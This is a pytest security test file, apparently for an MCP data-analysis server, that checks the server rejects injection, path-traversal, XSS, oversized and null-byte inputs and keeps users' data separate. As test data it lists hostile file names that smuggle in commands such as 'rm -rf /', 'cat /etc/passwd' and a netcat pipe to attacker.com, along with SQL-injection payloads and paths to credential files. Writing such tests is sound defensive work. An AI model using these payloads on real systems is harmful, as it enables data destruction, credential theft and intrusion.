"""
安全測試 - 注入攻擊與存取控制

測試系統對各種安全威脅的防禦能力
"""

import os

import httpx
import pytest


@pytest.mark.security
class TestInjectionAttacks:
    """測試注入攻擊防禦"""

    @pytest.fixture
    def mcp_base_url(self):
        return os.getenv("MCP_SERVER_URL", "http://localhost:8002")

    async def test_sql_injection_in_path(self, mcp_base_url):
        """測試路徑中的 SQL 注入"""
        malicious_paths = ["'; DROP TABLE datasets; --", "' OR '1'='1", "1' UNION SELECT * FROM users--"]

        async with httpx.AsyncClient(timeout=10.0) as client:
            for malicious_path in malicious_paths:
                response = await client.post(
                    f"{mcp_base_url}/mcp/tools/quick_preview", json={"csv_path": malicious_path}
                )

                # 應該返回錯誤，而不是執行 SQL
                assert response.status_code in [400, 404, 422]

    async def test_command_injection_in_filename(self, mcp_base_url):
        """測試檔名中的命令注入"""
        malicious_filenames = [
            "file.csv; rm -rf /",
            "file.csv && cat /etc/passwd",
            "file.csv | nc attacker.com 1234",
            "`whoami`.csv",
        ]

        async with httpx.AsyncClient(timeout=10.0) as client:
            for malicious_name in malicious_filenames:
                response = await client.post(
                    f"{mcp_base_url}/mcp/tools/upload_dataset",
                    json={
                        "name": malicious_name,
                        "source_type": "local",
                        "source_path": "/data/sample_data/iris.csv",
                        "storage_mode": "temporary",
                        "user_id": "attacker",
                    },
                )

                # 應該拒絕或清理檔名
                if response.status_code == 200:
                    result = response.json()
                    # 檢查檔名是否被清理
                    assert ";" not in str(result)
                    assert "&&" not in str(result)

    async def test_xss_in_html_report(self, mcp_base_url):
        """測試 HTML 報告中的 XSS"""
        async with httpx.AsyncClient(timeout=10.0) as client:
            # 嘗試在 group_column 注入腳本
            response = await client.post(
                f"{mcp_base_url}/mcp/tools/generate_tableone_directly",
                json={
                    "csv_path": "/data/sample_data/medical_study_200.csv",
                    "group_column": "<script>alert('XSS')</script>",
                },
            )

            if response.status_code == 200:
                result = response.json()
                html_report = result.get("html_report", "")

                # HTML 輸出應該轉義
                assert "<script>" not in html_report
                # 應該看到轉義後的版本
                if "script" in html_report.lower():
                    assert "&lt;script&gt;" in html_report or "Invalid" in html_report


@pytest.mark.security
class TestPathTraversal:
    """測試路徑遍歷攻擊"""

    @pytest.fixture
    def mcp_base_url(self):
        return os.getenv("MCP_SERVER_URL", "http://localhost:8002")

    async def test_directory_traversal(self, mcp_base_url):
        """測試目錄遍歷嘗試"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "../../../../../../etc/hosts",
        ]

        async with httpx.AsyncClient(timeout=10.0) as client:
            for malicious_path in malicious_paths:
                response = await client.post(
                    f"{mcp_base_url}/mcp/tools/quick_preview", json={"csv_path": malicious_path}
                )

                # 應該拒絕存取
                assert response.status_code in [400, 403, 404, 422]

    async def test_absolute_path_outside_allowed(self, mcp_base_url):
        """測試嘗試存取允許目錄外的絕對路徑"""
        forbidden_paths = ["/root/.ssh/id_rsa", "/home/other_user/secrets.txt", "/var/log/auth.log"]

        async with httpx.AsyncClient(timeout=10.0) as client:
            for forbidden_path in forbidden_paths:
                response = await client.post(
                    f"{mcp_base_url}/mcp/tools/quick_preview", json={"csv_path": forbidden_path}
                )

                # 應該拒絕
                assert response.status_code in [400, 403, 404, 422]


@pytest.mark.security
class TestRateLimiting:
    """測試速率限制"""

    @pytest.fixture
    def mcp_base_url(self):
        return os.getenv("MCP_SERVER_URL", "http://localhost:8002")

    async def test_rapid_requests(self, mcp_base_url):
        """測試快速連續請求（應觸發 rate limit）"""

        async with httpx.AsyncClient(timeout=5.0) as client:
            # 快速發送 100 個請求
            status_codes = []

            for _i in range(100):
                try:
                    response = await client.post(
                        f"{mcp_base_url}/mcp/tools/quick_preview", json={"csv_path": "/data/sample_data/iris.csv"}
                    )
                    status_codes.append(response.status_code)
                except Exception:
                    status_codes.append(0)

            # 應該有一些請求被限制（429 Too Many Requests）
            # 或所有請求成功但有 rate limit 警告
            rate_limited_count = sum(1 for code in status_codes if code == 429)

            print("\nRate limit test:")
            print(f"  Total requests: {len(status_codes)}")
            print(f"  Rate limited: {rate_limited_count}")
            print(f"  Success: {sum(1 for code in status_codes if code == 200)}")


@pytest.mark.security
class TestUserIsolation:
    """測試使用者隔離"""

    @pytest.fixture
    def mcp_base_url(self):
        return os.getenv("MCP_SERVER_URL", "http://localhost:8002")

    async def test_user_cannot_access_others_data(self, mcp_base_url):
        """測試使用者無法存取其他使用者的資料"""

        async with httpx.AsyncClient(timeout=30.0) as client:
            # User A 上傳資料
            upload_a = await client.post(
                f"{mcp_base_url}/mcp/tools/upload_dataset",
                json={
                    "name": "secret_data_a",
                    "source_type": "local",
                    "source_path": "/data/sample_data/iris.csv",
                    "storage_mode": "permanent",
                    "user_id": "user_a",
                },
            )

            if upload_a.status_code == 404:
                pytest.skip("MCP REST endpoint /mcp/tools/upload_dataset not available (SSE-only server)")
            assert upload_a.status_code == 200
            result_a = upload_a.json()
            dataset_id_a = result_a.get("dataset_id")

            if dataset_id_a:
                # User B 嘗試存取 User A 的資料
                try:
                    access_b = await client.post(
                        f"{mcp_base_url}/mcp/tools/some_analysis",
                        json={
                            "dataset_id": dataset_id_a,
                            "user_id": "user_b",  # 不同使用者
                        },
                    )

                    # 應該被拒絕
                    assert access_b.status_code in [403, 404]
                except Exception:
                    # 預期的錯誤
                    pass

    async def test_list_only_own_datasets(self, mcp_base_url):
        """測試列表只顯示自己的資料集"""

        async with httpx.AsyncClient(timeout=30.0) as client:
            # User A 列出資料集
            list_response = await client.get(f"{mcp_base_url}/mcp/tools/list_datasets", params={"user_id": "user_a"})

            if list_response.status_code == 200:
                datasets = list_response.json()

                # 檢查所有資料集都屬於 user_a
                for dataset in datasets.get("datasets", []):
                    if "user_id" in dataset:
                        assert dataset["user_id"] == "user_a"


@pytest.mark.security
class TestInputSanitization:
    """測試輸入清理"""

    @pytest.fixture
    def mcp_base_url(self):
        return os.getenv("MCP_SERVER_URL", "http://localhost:8002")

    async def test_large_payload_rejection(self, mcp_base_url):
        """測試超大 payload 被拒絕"""

        # 建立超大 payload (10MB JSON)
        huge_data = "x" * (10 * 1024 * 1024)

        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                response = await client.post(
                    f"{mcp_base_url}/mcp/tools/upload_dataset",
                    json={
                        "name": huge_data,  # 超大名稱
                        "source_type": "local",
                        "source_path": "/data/sample_data/iris.csv",
                        "storage_mode": "temporary",
                        "user_id": "test",
                    },
                )

                # 應該拒絕（413 Payload Too Large 或 400），或 404 if endpoint doesn't exist
                if response.status_code == 404:
                    pytest.skip("MCP REST endpoint /mcp/tools/upload_dataset not available (SSE-only server)")
                assert response.status_code in [400, 413, 422]

            except httpx.HTTPError:
                # 預期的錯誤
                pass

    async def test_null_byte_injection(self, mcp_base_url):
        """測試空字元注入"""

        malicious_path = "iris.csv\x00hidden.exe"

        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(f"{mcp_base_url}/mcp/tools/quick_preview", json={"csv_path": malicious_path})

            # 應該拒絕或清理
            assert response.status_code in [400, 404, 422]

    async def test_unicode_normalization(self, mcp_base_url):
        """測試 Unicode 正規化處理"""

        # 使用不同 Unicode 表示的相同字元
        path1 = "café.csv"  # é = U+00E9
        path2 = "café.csv"  # é = U+0065 U+0301

        # 兩者應該被視為相同（正規化後）
        import unicodedata

        normalized1 = unicodedata.normalize("NFC", path1)
        normalized2 = unicodedata.normalize("NFC", path2)

        assert normalized1 == normalized2


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "security"])
